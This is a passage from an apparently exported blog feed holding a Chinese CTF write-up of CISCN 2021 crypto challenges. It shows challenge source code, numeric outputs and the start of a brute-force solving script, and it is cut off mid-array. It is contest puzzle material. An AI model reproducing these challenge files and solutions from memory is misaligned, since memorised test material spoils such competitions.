      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>Hi_THERE_HZNU_HISER</category>
      </categories>
  </entry>
  <entry>
    <title>20210516 国赛Crypto方向部分WP</title>
    <url>/posts/766eb6e4/</url>
    <content><![CDATA[<p>&nbsp;</p>
<span id="more"></span>

<h1 id="20210516-国赛Crypto方向部分WP"><a href="#20210516-国赛Crypto方向部分WP" class="headerlink" title="20210516 国赛Crypto方向部分WP"></a>20210516 国赛Crypto方向部分WP</h1><h2 id="【古典签到】（recuring）"><a href="#【古典签到】（recuring）" class="headerlink" title="【古典签到】（recuring）"></a>【古典签到】（recuring）</h2><p><em>做完忘记名字了</em></p>
<p>一道签到题，都是古典密码，一开始用的是ADFGX加密，<a href="https://www.dcode.fr/en">推荐这个网站，贼好用</a></p>
<p>用的是默认的那个字母表，没有keyword，但是第一步出来的没有任何含义，后面是一个栅栏一个凯撒，顺序忘了</p>
<p>我组员当时是手撕的，还拿了一血，呜呜呜，别问我为什么会有这么强的组员，也别问我为什么那么菜还可以当别人组长</p>
<h2 id="move（unsolved）"><a href="#move（unsolved）" class="headerlink" title="move（unsolved）"></a>move（unsolved）</h2><p>（没做出来，有缘再更）</p>
<h3 id="一、题目描述"><a href="#一、题目描述" class="headerlink" title="一、题目描述"></a>一、题目描述</h3><img alt="README-a01d6b78.png" data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/README-a01d6b78.png" width="" height="" >

<img alt="README-5c639665.png" data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/README-5c639665.png" width="" height="" >

<img alt="README-b653abcd.png" data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/README-b653abcd.png" width="" height="" >
应该是用到copperSmith

<p>task.py</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> sqrt, gcd</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">BITS = <span class="number">512</span></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;rb&quot;</span>)</span><br><span class="line">flag = f.read()</span><br><span class="line">f.close()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_prime</span>(<span class="params">nbit</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        p = getPrime(nbit)</span><br><span class="line">        <span class="keyword">if</span> p % <span class="number">3</span> == <span class="number">2</span>:</span><br><span class="line">            <span class="keyword">return</span> p</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gen</span>(<span class="params">nbit</span>):</span></span><br><span class="line">    p = get_prime(nbit)</span><br><span class="line">    q = get_prime(nbit)</span><br><span class="line">    <span class="keyword">if</span> q &gt; p:</span><br><span class="line">        p, q = q, p</span><br><span class="line">    n = p * q</span><br><span class="line">    bound = <span class="built_in">int</span>(sqrt(<span class="number">2</span> * n)) // <span class="number">12</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        x = random.randint(<span class="number">1</span>, <span class="built_in">round</span>(sqrt(bound)))</span><br><span class="line">        y = random.randint(<span class="number">1</span>, bound) // x</span><br><span class="line">        zbound = <span class="built_in">int</span>(((p - q) * <span class="built_in">round</span>(n ** <span class="number">0.25</span>) * y) // (<span class="number">3</span> * (p + q)))</span><br><span class="line">        z = zbound - ((p + <span class="number">1</span>) * (q + <span class="number">1</span>) * y + zbound) % x</span><br><span class="line">        e = ((p + <span class="number">1</span>) * (q + <span class="number">1</span>) * y + z) // x</span><br><span class="line">        <span class="keyword">if</span> gcd(e, (p + <span class="number">1</span>) * (q + <span class="number">1</span>)) == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    gifts = [<span class="built_in">int</span>(<span class="built_in">bin</span>(p)[<span class="number">2</span>:][:<span class="number">22</span>], <span class="number">2</span>), <span class="built_in">int</span>(<span class="built_in">bin</span>(p)[<span class="number">2</span>:][<span class="number">256</span>:<span class="number">276</span>], <span class="number">2</span>)]</span><br><span class="line">    <span class="keyword">return</span> n, e, gifts</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">p1, p2</span>):</span></span><br><span class="line">    <span class="keyword">if</span> p1 == (<span class="number">0</span>, <span class="number">0</span>):</span><br><span class="line">        <span class="keyword">return</span> p2</span><br><span class="line">    <span class="keyword">if</span> p2 == (<span class="number">0</span>, <span class="number">0</span>):</span><br><span class="line">        <span class="keyword">return</span> p1</span><br><span class="line">    <span class="keyword">if</span> p1[<span class="number">0</span>] == p2[<span class="number">0</span>] <span class="keyword">and</span> (p1[<span class="number">1</span>] != p2[<span class="number">1</span>] <span class="keyword">or</span> p1[<span class="number">1</span>] == <span class="number">0</span>):</span><br><span class="line">        <span class="keyword">return</span> (<span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">if</span> p1[<span class="number">0</span>] == p2[<span class="number">0</span>]:</span><br><span class="line">        tmp = (<span class="number">3</span> * p1[<span class="number">0</span>] * p1[<span class="number">0</span>]) * inverse(<span class="number">2</span> * p1[<span class="number">1</span>], n) % n</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        tmp = (p2[<span class="number">1</span>] - p1[<span class="number">1</span>]) * inverse(p2[<span class="number">0</span>] - p1[<span class="number">0</span>], n) % n</span><br><span class="line">    x = (tmp * tmp - p1[<span class="number">0</span>] - p2[<span class="number">0</span>]) % n</span><br><span class="line">    y = (tmp * (p1[<span class="number">0</span>] - x) - p1[<span class="number">1</span>]) % n</span><br><span class="line">    <span class="keyword">return</span> (<span class="built_in">int</span>(x), <span class="built_in">int</span>(y))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mul</span>(<span class="params">n, p</span>):</span></span><br><span class="line">    r = (<span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">    tmp = p</span><br><span class="line">    <span class="keyword">while</span> <span class="number">0</span> &lt; n:</span><br><span class="line">        <span class="keyword">if</span> n &amp; <span class="number">1</span> == <span class="number">1</span>:</span><br><span class="line">            r = add(r, tmp)</span><br><span class="line">        n, tmp = n &gt;&gt; <span class="number">1</span>, add(tmp, tmp)</span><br><span class="line">    <span class="keyword">return</span> r</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">n, e, hint = gen(BITS)</span><br><span class="line">pt = (bytes_to_long(flag[:<span class="built_in">len</span>(flag) // <span class="number">2</span>]), bytes_to_long(flag[<span class="built_in">len</span>(flag) // <span class="number">2</span>:]))</span><br><span class="line">c = mul(e, pt)</span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;output.txt&quot;</span>, <span class="string">&quot;w&quot;</span>)</span><br><span class="line">f.write(<span class="string">f&quot;n = <span class="subst">&#123;n&#125;</span>\n&quot;</span>)</span><br><span class="line">f.write(<span class="string">f&quot;e = <span class="subst">&#123;e&#125;</span>\n&quot;</span>)</span><br><span class="line">f.write(<span class="string">f&quot;h1 = <span class="subst">&#123;hint[<span class="number">0</span>]&#125;</span>\n&quot;</span>)</span><br><span class="line">f.write(<span class="string">f&quot;h2 = <span class="subst">&#123;hint[<span class="number">1</span>]&#125;</span>\n&quot;</span>)</span><br><span class="line">f.write(<span class="string">f&quot;c = <span class="subst">&#123;c&#125;</span>\n&quot;</span>)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure>

<p>output.txt</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">n = <span class="number">80263253261445006152401958351371889864136455346002795891511487600252909606767728751977033280031100015044527491214958035106007038983560835618126173948587479951247946411421106848023637323702085026892674032294882180449860010755423988302942811352582243198025232225481839705626921264432951916313817802968185697281</span></span><br><span class="line">e = <span class="number">67595664083683668964629173652731210158790440033379175857028564313854014366016864587830963691802591775486321717360190604997584315420339351524880699113147436604350832401671422613906522464334532396034178284918058690365507263856479304019153987101884697932619200538492228093521576834081916538860988787322736613809</span></span><br><span class="line">h1 = <span class="number">3518005</span></span><br><span class="line">h2 = <span class="number">641975</span></span><br><span class="line">c = (<span class="number">6785035174838834841914183175930647480879288136014127270387869708755060512201304812721289604897359441373759673837533885681257952731178067761309151636485456082277426056629351492198510336245951408977207910307892423796711701271285060489337800033465030600312615976587155922834617686938658973507383512257481837605</span>, <span class="number">38233052047321946362283579951524857528047793820071079629483638995357740390030253046483152584725740787856777849310333417930989050087087487329435299064039690255526263003473139694460808679743076963542716855777569123353687450350073011620347635639646034793626760244748027610309830233139635078417444771674354527028</span>)</span><br></pre></td></tr></table></figure>

<h3 id="二、解题思路"><a href="#二、解题思路" class="headerlink" title="二、解题思路"></a>二、解题思路</h3><p>不会了，也截止了</p>
<h2 id="imageencrypt（recuring）"><a href="#imageencrypt（recuring）" class="headerlink" title="imageencrypt（recuring）"></a>imageencrypt（recuring）</h2><p>差一点，解密的时候有点问题，贴下用到的脚本，这里只求理解，确实效率是有点低</p>
<h3 id="一、题目代码"><a href="#一、题目代码" class="headerlink" title="一、题目代码"></a>一、题目代码</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag,image,r,key1,key2</span><br><span class="line"><span class="keyword">import</span> md5</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span>(flag[:<span class="number">5</span>]==<span class="string">&#x27;CISCN&#x27;</span>)</span><br><span class="line"><span class="keyword">assert</span>(<span class="built_in">len</span>(<span class="built_in">str</span>(r))==<span class="number">3</span>)</span><br><span class="line">data = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(<span class="built_in">chr</span>,image))</span><br><span class="line"><span class="keyword">assert</span>(flag[<span class="number">6</span>:-<span class="number">1</span>] == md5.new(data).hexdigest())</span><br><span class="line"><span class="keyword">assert</span>(key1&lt;<span class="number">256</span>)</span><br><span class="line"><span class="keyword">assert</span>(key2&lt;<span class="number">256</span>)</span><br><span class="line"></span><br><span class="line">x0 = random.random()    <span class="comment"># 产生六位小数</span></span><br><span class="line">x0 = <span class="built_in">round</span>(x0,<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">round</span>(r*x*(<span class="number">3</span>-x),<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">pixel,key1,key2,x0,m,n</span>):</span></span><br><span class="line">    num = m*n/<span class="number">8</span>    </span><br><span class="line">    seqs = []</span><br><span class="line">    x = x0</span><br><span class="line">    bins = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    tmp = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(num):</span><br><span class="line">        x = generate(x)</span><br><span class="line">        tmp.append(x)</span><br><span class="line">        seqs.append(<span class="built_in">int</span>(x*<span class="number">22000</span>))</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> seqs:</span><br><span class="line">        bin_x  = <span class="built_in">bin</span>(x)[<span class="number">2</span>:]</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(bin_x) &lt; <span class="number">16</span>:</span><br><span class="line">            bin_x = <span class="string">&#x27;0&#x27;</span>*(<span class="number">16</span>-<span class="built_in">len</span>(bin_x))+bin_x</span><br><span class="line">        bins += bin_x</span><br><span class="line">    <span class="keyword">assert</span>(<span class="built_in">len</span>(pixel) == m*n)</span><br><span class="line">    cipher = [ <span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m) <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(n)]   <span class="comment"># 256个零</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">            index = n*i+j</span><br><span class="line">            ch = <span class="built_in">int</span>(bins[<span class="number">2</span>*index:<span class="number">2</span>*index+<span class="number">2</span>],<span class="number">2</span>)</span><br><span class="line">            pix = pixel[index]</span><br><span class="line">            <span class="keyword">if</span> ch == <span class="number">0</span>:</span><br><span class="line">                pix = (pix^key1)&amp;<span class="number">0xff</span></span><br><span class="line">            <span class="keyword">if</span> ch == <span class="number">1</span>:</span><br><span class="line">                pix = (~pix^key1)&amp;<span class="number">0xff</span></span><br><span class="line">            <span class="keyword">if</span> ch == <span class="number">2</span>:</span><br><span class="line">                pix = (pix^key2)&amp;<span class="number">0xff</span></span><br><span class="line">            <span class="keyword">if</span> ch == <span class="number">3</span>:</span><br><span class="line">                pix = (~pix^key2)&amp;<span class="number">0xff</span></span><br><span class="line">            cipher[index] = pix</span><br><span class="line">    <span class="keyword">return</span> cipher</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flagimage = image</span><br><span class="line">testimage = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>*<span class="number">16</span>):</span><br><span class="line">    testimage.append(random.randint(<span class="number">0</span>,<span class="number">255</span>))</span><br><span class="line"><span class="built_in">print</span>(testimage)</span><br><span class="line"><span class="built_in">print</span>(encrypt(testimage,key1,key2,x0,<span class="number">16</span>,<span class="number">16</span>))</span><br><span class="line"><span class="built_in">print</span>(encrypt(flagimage,key1,key2,x0,<span class="number">24</span>,<span class="number">16</span>))</span><br></pre></td></tr></table></figure>

<h3 id="二、直接爆破"><a href="#二、直接爆破" class="headerlink" title="二、直接爆破"></a>二、直接爆破</h3><p>主要的思路就是一个一个搞，爆他，首先key1和key2好搞，现在忘了</p>
<p>然后r的话不在下面这三个数之内就没有意义了，你可以试试（你过来呀）</p>
<p>然后我的思路是最简单的爆破，有点慢，但是能出来，当时我用我们队里另外一个队员的电脑同时跑的，他从0开始，我从0.9开始哈哈哈哈哈哈哈，然后我先跑出来了，因为是0.8开始的</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> digits</span><br><span class="line"></span><br><span class="line">encrypt_flagimage = [<span class="number">198</span>, <span class="number">143</span>, <span class="number">247</span>, <span class="number">3</span>, <span class="number">152</span>, <span class="number">139</span>, <span class="number">131</span>, <span class="number">84</span>, <span class="number">181</span>, <span class="number">180</span>, <span class="number">252</span>, <span class="number">177</span>, <span class="number">192</span>, <span class="number">25</span>, <span class="number">217</span>, <span class="number">179</span>, <span class="number">136</span>, <span class="number">107</span>, <span class="number">190</span>, <span class="number">62</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">90</span>, <span class="number">53</span>, <span class="number">105</span>, <span class="number">238</span>, <span class="number">117</span>, <span class="number">44</span>, <span class="number">5</span>, <span class="number">116</span>, <span class="number">132</span>, <span class="number">195</span>, <span class="number">214</span>, <span class="number">171</span>, <span class="number">113</span>, <span class="number">209</span>, <span class="number">18</span>, <span class="number">31</span>, <span class="number">194</span>, <span class="number">174</span>, <span class="number">228</span>, <span class="number">212</span>, <span class="number">196</span>, <span class="number">14</span>, <span class="number">27</span>, <span class="number">41</span>, <span class="number">211</span>, <span class="number">56</span>, <span class="number">139</span>, <span class="number">135</span>, <span class="number">225</span>, <span class="number">214</span>, <span class="number">89</span>, <span class="number">122</span>, <span class="number">178</span>, <span class="number">212</span>, <span class="number">185</span>, <span class="number">231</span>, <span class="number">204</span>, <span class="number">150</span>, <span class="number">204</span>, <span class="number">212</span>, <span class="number">160</span>, <span class="number">142</span>, <span class="number">213</span>, <span class="number">173</span>, <span class="number">186</span>, <span class="number">166</span>, <span class="number">65</span>, <span class="number">238</span>, <span class="number">5</span>, <span class="number">32</span>, <span class="number">45</span>, <span class="number">31</span>, <span class="number">25</span>, <span class="number">189</span>, <span class="number">148</span>, <span class="number">38</span>, <span class="number">78</span>, <span class="number">79</span>, <span class="number">33</span>, <span class="number">56</span>, <span class="number">227</span>, <span class="number">48</span>, <span class="number">103</span>, <span class="number">163</span>, <span class="number">31</span>, <span class="number">189</span>, <span class="number">37</span>, <span class="number">124</span>, <span class="number">106</span>, <span class="number">249</span>, <span class="number">86</span>, <span class="number">188</span>, <span class="number">86</span>, <span class="number">233</span>, <span class="number">41</span>, <span class="number">250</span>, <span class="number">89</span>, <span class="number">7</span>, <span class="number">212</span>, <span class="number">234</span>, <span class="number">111</span>, <span class="number">104</span>, <span class="number">245</span>, <span class="number">102</span>, <span class="number">227</span>, <span class="number">96</span>, <span class="number">160</span>, <span class="number">67</span>, <span class="number">181</span>, <span class="number">13</span>, <span class="number">26</span>, <span class="number">192</span>, <span class="number">214</span>, <span class="number">210</span>, <span class="number">188</span>, <span class="number">84</span>, <span class="number">216</span>, <span class="number">215</span>, <span class="number">243</span>, <span class="number">72</span>, <span class="number">233</span>, <span class="number">2</span>, <span class="number">122</span>, <span class="number">166</span>, <span class="number">107</span>, <span class="number">251</span>, <span class="number">70</span>, <span class="number">128</span>, <span class="number">94</span>, <span class="number">190</span>, <span class="number">185</span>, <span class="number">210</span>, <span class="number">34</span>, <span class="number">85</span>, <span class="number">77</span>, <span class="number">29</span>, <span class="number">182</span>, <span class="number">77</span>, <span class="number">115</span>, <span class="number">208</span>, <span class="number">228</span>, <span class="number">252</span>, <span class="number">73</span>, <span class="number">198</span>, <span class="number">151</span>, <span class="number">70</span>, <span class="number">10</span>, <span class="number">97</span>, <span class="number">138</span>, <span class="number">235</span>, <span class="number">21</span>, <span class="number">117</span>, <span class="number">239</span>, <span class="number">102</span>, <span class="number">129</span>, <span class="number">2</span>, <span class="number">253</span>, <span class="number">80</span>, <span class="number">53</span>, <span class="number">61</span>, <span class="number">184</span>, <span class="number">220</span>, <span class="number">41</span>, <span class="number">82</span>, <span class="number">37</span>, <span class="number">140</span>, <span class="number">23</span>, <span class="number">143</span>, <span class="number">179</span>, <span class="number">53</span>, <span class="number">153</span>, <span class="number">113</span>, <span class="number">213</span>, <span class="number">211</span>, <span class="number">111</span>, <span class="number">197</span>, <span class="number">248</span>, <span class="number">65</span>, <span class="number">60</span>, <span class="number">69</span>, <span class="number">1</span>, <span class="number">81</span>, <span class="number">48</span>, <span class="number">254</span>, <span class="number">251</span>, <span class="number">89</span>, <span class="number">195</span>, <span class="number">8</span>, <span class="number">93</span>, <span class="number">190</span>, <span class="number">66</span>, <span class="number">174</span>, <span class="number">97</span>, <span class="number">175</span>, <span class="number">210</span>, <span class="number">191</span>, <span class="number">66</span>, <span class="number">112</span>, <span class="number">123</span>, <span class="number">128</span>, <span class="number">33</span>, <span class="number">230</span>, <span class="number">237</span>, <span class="number">104</span>, <span class="number">16</span>, <span class="number">192</span>, <span class="number">239</span>, <span class="number">173</span>, <span class="number">44</span>, <span class="number">10</span>, <span class="number">120</span>, <span class="number">231</span>, <span class="number">114</span>, <span class="number">151</span>, <span class="number">140</span>, <span class="number">63</span>, <span class="number">103</span>, <span class="number">44</span>, <span class="number">243</span>, <span class="number">222</span>, <span class="number">242</span>, <span class="number">73</span>, <span class="number">51</span>, <span class="number">46</span>, <span class="number">98</span>, <span class="number">137</span>, <span class="number">163</span>, <span class="number">152</span>, <span class="number">147</span>, <span class="number">95</span>, <span class="number">223</span>, <span class="number">3</span>, <span class="number">15</span>, <span class="number">112</span>, <span class="number">85</span>, <span class="number">215</span>, <span class="number">133</span>, <span class="number">131</span>, <span class="number">240</span>, <span class="number">239</span>, <span class="number">224</span>, <span class="number">195</span>, <span class="number">140</span>, <span class="number">124</span>, <span class="number">70</span>, <span class="number">156</span>, <span class="number">221</span>, <span class="number">241</span>, <span class="number">37</span>, <span class="number">245</span>, <span class="number">1</span>, <span class="number">99</span>, <span class="number">9</span>, <span class="number">157</span>, <span class="number">99</span>, <span class="number">150</span>, <span class="number">47</span>, <span class="number">118</span>, <span class="number">225</span>, <span class="number">16</span>, <span class="number">13</span>, <span class="number">141</span>, <span class="number">135</span>, <span class="number">99</span>, <span class="number">18</span>, <span class="number">119</span>, <span class="number">63</span>, <span class="number">160</span>, <span class="number">6</span>, <span class="number">247</span>, <span class="number">27</span>, <span class="number">68</span>, <span class="number">45</span>, <span class="number">199</span>, <span class="number">86</span>, <span class="number">193</span>, <span class="number">252</span>, <span class="number">21</span>, <span class="number">135</span>, <span class="number">32</span>, <span class="number">42</span>, <span class="number">103</span>, <span class="number">114</span>, <span class="number">241</span>, <span class="number">49</span>, <span class="number">249</span>, <span class="number">182</span>, <span class="number">52</span>, <span class="number">18</span>, <span class="number">155</span>, <span class="number">157</span>, <span class="number">61</span>, <span class="number">4</span>, <span class="number">246</span>, <span class="number">158</span>, <span class="number">52</span>, <span class="number">118</span>, <span class="number">242</span>, <span class="number">195</span>, <span class="number">54</span>, <span class="number">139</span>, <span class="number">232</span>, <span class="number">100</span>, <span class="number">31</span>, <span class="number">11</span>, <span class="number">233</span>, <span class="number">58</span>, <span class="number">100</span>, <span class="number">101</span>, <span class="number">137</span>, <span class="number">83</span>, <span class="number">145</span>, <span class="number">209</span>, <span class="number">7</span>, <span class="number">241</span>, <span class="number">96</span>, <span class="number">57</span>, <span class="number">148</span>, <span class="number">207</span>, <span class="number">29</span>, <span class="number">237</span>, <span class="number">124</span>, <span class="number">177</span>, <span class="number">166</span>, <span class="number">161</span>, <span class="number">20</span>, <span class="number">116</span>, <span class="number">122</span>, <span class="number">61</span>, <span class="number">71</span>, <span class="number">46</span>, <span class="number">82</span>, <span class="number">18</span>, <span class="number">157</span>, <span class="number">253</span>, <span class="number">130</span>, <span class="number">112</span>, <span class="number">66</span>, <span class="number">94</span>, <span class="number">57</span>, <span class="number">221</span>, <span class="number">243</span>, <span class="number">222</span>, <span class="number">192</span>, <span class="number">147</span>, <span class="number">5</span>, <span class="number">130</span>, <span class="number">201</span>, <span class="number">174</span>, <span class="number">26</span>, <span class="number">160</span>, <span class="number">16</span>, <span class="number">188</span>, <span class="number">103</span>, <span class="number">187</span>, <span class="number">11</span>, <span class="number">238</span>, <span class="number">182</span>, <span class="number">144</span>, <span class="number">4</span>, <span class="number">137</span>, <span class="number">33</span>, <span class="number">84</span>, <span class="number">100</span>, <span class="number">7</span>, <span class="number">239</span>, <span class="number">219</span>, <span class="number">83</span>, <span class="number">112</span>, <span class="number">189</span>, <span class="number">166</span>, <span class="number">58</span>, <span class="number">93</span>, <span class="number">141</span>, <span class="number">30</span>, <span class="number">198</span>, <span class="number">220</span>, <span class="number">196</span>, <span class="number">118</span>, <span class="number">172</span>, <span class="number">5</span>, <span class="number">45</span>]</span><br><span class="line"></span><br><span class="line">testimage = [<span class="number">205</span>, <span class="number">237</span>, <span class="number">6</span>, <span class="number">158</span>, <span class="number">24</span>, <span class="number">119</span>, <span class="number">213</span>, <span class="number">32</span>, <span class="number">74</span>, <span class="number">151</span>, <span class="number">142</span>, <span class="number">186</span>, <span class="number">57</span>, <span class="number">28</span>, <span class="number">113</span>, <span class="number">62</span>, <span class="number">165</span>, <span class="number">20</span>, <span class="number">190</span>, <span class="number">37</span>, <span class="number">159</span>, <span class="number">137</span>, <span class="number">196</span>, <span class="number">44</span>, <span class="number">97</span>, <span class="number">37</span>, <span class="number">7</span>, <span class="number">222</span>, <span class="number">220</span>, <span class="number">95</span>, <span class="number">4</span>, <span class="number">66</span>, <span class="number">0</span>, <span class="number">28</span>, <span class="number">199</span>, <span class="number">142</span>, <span class="number">95</span>, <span class="number">105</span>, <span class="number">119</span>, <span class="number">232</span>, <span class="number">250</span>, <span class="number">215</span>, <span class="number">60</span>, <span class="number">162</span>, <span class="number">91</span>, <span class="number">211</span>, <span class="number">63</span>, <span class="number">30</span>, <span class="number">91</span>, <span class="number">108</span>, <span class="number">217</span>, <span class="number">206</span>, <span class="number">80</span>, <span class="number">193</span>, <span class="number">230</span>, <span class="number">42</span>, <span class="number">221</span>, <span class="number">71</span>, <span class="number">136</span>, <span class="number">115</span>, <span class="number">22</span>, <span class="number">176</span>, <span class="number">91</span>, <span class="number">57</span>, <span class="number">61</span>, <span class="number">3</span>, <span class="number">87</span>, <span class="number">73</span>, <span class="number">250</span>, <span class="number">121</span>, <span class="number">51</span>, <span class="number">72</span>, <span class="number">83</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">199</span>, <span class="number">236</span>, <span class="number">190</span>, <span class="number">249</span>, <span class="number">116</span>, <span class="number">45</span>, <span class="number">6</span>, <span class="number">134</span>, <span class="number">110</span>, <span class="number">149</span>, <span class="number">94</span>, <span class="number">214</span>, <span class="number">232</span>, <span class="number">153</span>, <span class="number">213</span>, <span class="number">119</span>, <span class="number">98</span>, <span class="number">81</span>, <span class="number">203</span>, <span class="number">240</span>, <span class="number">114</span>, <span class="number">240</span>, <span class="number">29</span>, <span class="number">122</span>, <span class="number">188</span>, <span class="number">156</span>, <span class="number">53</span>, <span class="number">128</span>, <span class="number">185</span>, <span class="number">40</span>, <span class="number">147</span>, <span class="number">245</span>, <span class="number">204</span>, <span class="number">47</span>, <span class="number">101</span>, <span class="number">80</span>, <span class="number">229</span>, <span class="number">41</span>, <span class="number">150</span>, <span class="number">28</span>, <span class="number">195</span>, <span class="number">25</span>, <span class="number">235</span>, <span class="number">119</span>, <span class="number">6</span>, <span class="number">192</span>, <span class="number">8</span>, <span class="number">73</span>, <span class="number">255</span>, <span class="number">159</span>, <span class="number">172</span>, <span class="number">77</span>, <span class="number">94</span>, <span class="number">254</span>, <span class="number">104</span>, <span class="number">236</span>, <span class="number">219</span>, <span class="number">141</span>, <span class="number">91</span>, <span class="number">195</span>, <span class="number">162</span>, <span class="number">97</span>, <span class="number">56</span>, <span class="number">252</span>, <span class="number">173</span>, <span class="number">163</span>, <span class="number">43</span>, <span class="number">167</span>, <span class="number">214</span>, <span class="number">50</span>, <span class="number">73</span>, <span class="number">115</span>, <span class="number">190</span>, <span class="number">254</span>, <span class="number">53</span>, <span class="number">61</span>, <span class="number">77</span>, <span class="number">138</span>, <span class="number">192</span>, <span class="number">15</span>, <span class="number">4</span>, <span class="number">190</span>, <span class="number">27</span>, <span class="number">37</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">135</span>, <span class="number">90</span>, <span class="number">215</span>, <span class="number">106</span>, <span class="number">243</span>, <span class="number">112</span>, <span class="number">111</span>, <span class="number">106</span>, <span class="number">89</span>, <span class="number">143</span>, <span class="number">150</span>, <span class="number">185</span>, <span class="number">142</span>, <span class="number">192</span>, <span class="number">176</span>, <span class="number">48</span>, <span class="number">138</span>, <span class="number">164</span>, <span class="number">185</span>, <span class="number">61</span>, <span class="number">77</span>, <span class="number">72</span>, <span class="number">0</span>, <span class="number">17</span>, <span class="number">203</span>, <span class="number">210</span>, <span class="number">71</span>, <span class="number">186</span>, <span class="number">49</span>, <span class="number">162</span>, <span class="number">250</span>, <span class="number">218</span>, <span class="number">219</span>, <span class="number">195</span>, <span class="number">63</span>, <span class="number">248</span>, <span class="number">220</span>, <span class="number">155</span>, <span class="number">180</span>, <span class="number">219</span>, <span class="number">132</span>, <span class="number">219</span>, <span class="number">94</span>, <span class="number">144</span>, <span class="number">247</span>, <span class="number">211</span>, <span class="number">95</span>, <span class="number">70</span>, <span class="number">227</span>, <span class="number">222</span>, <span class="number">31</span>, <span class="number">69</span>, <span class="number">24</span>, <span class="number">13</span>, <span class="number">216</span>, <span class="number">185</span>, <span class="number">108</span>, <span class="number">137</span>, <span class="number">57</span>, <span class="number">186</span>, <span class="number">211</span>, <span class="number">55</span>, <span class="number">27</span>, <span class="number">158</span>, <span class="number">241</span>, <span class="number">223</span>, <span class="number">21</span>, <span class="number">134</span>, <span class="number">106</span>, <span class="number">152</span>, <span class="number">127</span>, <span class="number">187</span>, <span class="number">245</span>, <span class="number">246</span>, <span class="number">131</span>, <span class="number">176</span>, <span class="number">177</span>, <span class="number">228</span>, <span class="number">100</span>, <span class="number">112</span>, <span class="number">11</span>, <span class="number">84</span>, <span class="number">61</span>, <span class="number">193</span>, <span class="number">42</span>, <span class="number">41</span>, <span class="number">69</span>, <span class="number">229</span>, <span class="number">145</span>, <span class="number">254</span>, <span class="number">138</span>, <span class="number">3</span>, <span class="number">153</span>, <span class="number">123</span>, <span class="number">31</span>]</span><br><span class="line"></span><br><span class="line">encrypt_testimage = [<span class="number">131</span>, <span class="number">92</span>, <span class="number">72</span>, <span class="number">47</span>, <span class="number">177</span>, <span class="number">57</span>, <span class="number">131</span>, <span class="number">118</span>, <span class="number">4</span>, <span class="number">38</span>, <span class="number">192</span>, <span class="number">19</span>, <span class="number">119</span>, <span class="number">82</span>, <span class="number">63</span>, <span class="number">143</span>, <span class="number">235</span>, <span class="number">165</span>, <span class="number">15</span>, <span class="number">140</span>, <span class="number">209</span>, <span class="number">223</span>, <span class="number">117</span>, <span class="number">133</span>, <span class="number">47</span>, <span class="number">148</span>, <span class="number">81</span>, <span class="number">144</span>, <span class="number">138</span>, <span class="number">246</span>, <span class="number">173</span>, <span class="number">235</span>, <span class="number">177</span>, <span class="number">181</span>, <span class="number">110</span>, <span 